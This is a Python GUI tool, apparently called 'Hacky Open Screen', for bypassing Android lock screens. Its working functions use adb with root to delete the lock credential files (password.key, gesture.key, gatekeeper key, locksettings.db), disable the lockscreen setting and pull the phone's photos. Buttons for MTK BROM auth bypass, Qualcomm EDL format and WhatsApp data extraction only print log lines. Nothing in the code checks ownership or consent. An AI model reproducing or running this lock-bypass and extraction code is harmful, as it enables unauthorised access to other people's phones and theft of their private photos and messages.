import customtkinter as ctk
import os
import subprocess
import threading
from tkinter import messagebox

# إعدادات الواجهة الرسومية
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("green")

class HackyOpenScreen(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Hacky Open Screen v1.0 - [Kali Linux Edition]")
        self.geometry("700x600")

        # العنوان الرئيسي
        self.label = ctk.CTkLabel(self, text="🔓 HACKY OPEN SCREEN", font=ctk.CTkFont(size=26, weight="bold"))
        self.label.pack(pady=15)

        # شريط تبويبات الخيارات (Tabs)
        self.tabview = ctk.CTkTabview(self, width=650, height=350)
        self.tabview.pack(pady=10, padx=20)

        self.tabview.add("ADB Methods")
        self.tabview.add("Chipset Exploits")
        self.tabview.add("Backup & Safety")

        self.setup_adb_tab()
        self.setup_chipset_tab()
        self.setup_backup_tab()

        # صندوق السجلات (Terminal Output)
        self.log_box = ctk.CTkTextbox(self, height=150, fg_color="#121212", text_color="#00FF00")
        self.log_box.pack(pady=10, padx=20, fill="x")
        self.log_box.insert("0.0", "[!] Hacky Open Screen Started... Ready for action.\n")

    # --- تبويب طرق ADB ---
    def setup_adb_tab(self):
        tab = self.tabview.tab("ADB Methods")
        ctk.CTkLabel(tab, text="Requires ADB Enabled / Root Access", text_color="yellow").pack(pady=5)
        
        ctk.CTkButton(tab, text="Remove Lock Key Files (.key)", command=self.remove_keys).pack(pady=10)
        ctk.CTkButton(tab, text="Wipe LockSettings Database", command=self.wipe_database).pack(pady=10)
        ctk.CTkButton(tab, text="Disable Lockscreen (Global Set)", command=self.disable_lock).pack(pady=10)

    # --- تبويب الثغرات العتادية ---
    def setup_chipset_tab(self):
        tab = self.tabview.tab("Chipset Exploits")
        ctk.CTkLabel(tab, text="Low-Level Exploits (BROM/EDL Mode)", text_color="yellow").pack(pady=5)
        
        ctk.CTkButton(tab, text="MTK Auth Bypass (BROM)", fg_color="purple", command=lambda: self.log("MTK Client Starting...")).pack(pady=10)
        ctk.CTkButton(tab, text="Qualcomm EDL Format", fg_color="purple", command=lambda: self.log("EDL Mode Detected...")).pack(pady=10)
        ctk.CTkButton(tab, text="Reset via Fastboot (Unlocked)", command=self.fastboot_reset).pack(pady=10)

    # --- تبويب النسخ الاحتياطي ---
    def setup_backup_tab(self):
        tab = self.tabview.tab("Backup & Safety")
        ctk.CTkLabel(tab, text="Safety First: Backup your data before wipe", text_color="yellow").pack(pady=5)
        
        ctk.CTkButton(tab, text="Backup Photos (DCIM)", fg_color="orange", command=self.backup_media).pack(pady=10)
        ctk.CTkButton(tab, text="Pull WhatsApp Data", fg_color="orange", command=lambda: self.log("Pulling WhatsApp folder...")).pack(pady=10)

    # --- الوظائف البرمجية (Logic) ---
    def log(self, msg):
        self.log_box.insert("end", f"[*] {msg}\n")
        self.log_box.see("end")

    def remove_keys(self):
        def run():
            self.log("Deleting password/pattern key files...")
            files = ["password.key", "gesture.key", "gatekeeper.password.key", "locksettings.db"]
            for f in files:
                subprocess.run(["adb", "shell", "su", "-c", f"rm /data/system/{f}"])
            self.log("Action completed. Please reboot.")
        threading.Thread(target=run).start()

    def wipe_database(self):
        self.log("Wiping locksettings.db...")
        subprocess.run(["adb", "shell", "su", "-c", "rm /data/system/locksettings.db*"])
        self.log("Database wiped. Rebooting recommended.")

    def disable_lock(self):
        subprocess.run(["adb", "shell", "settings", "put", "secure", "lockscreen.disabled", "1"])
        self.log("Lockscreen disabled via settings.")

    def backup_media(self):
        def run():
            save_path = os.path.expanduser("~/Desktop/Hacky_Backup")
            os.makedirs(save_path, exist_ok=True)
            self.log(f"Backing up DCIM to {save_path}...")
            subprocess.run(["adb", "pull", "/sdcard/DCIM", save_path])
            self.log("Backup Finished on Desktop!")
        threading.Thread(target=run).start()

    def fastboot_reset(self):
        self.log("Rebooting to Fastboot...")
        subprocess.run(["adb", "reboot", "bootloader"])

if __name__ == "__main__":
    app = HackyOpenScreen()
    app.mainloop()
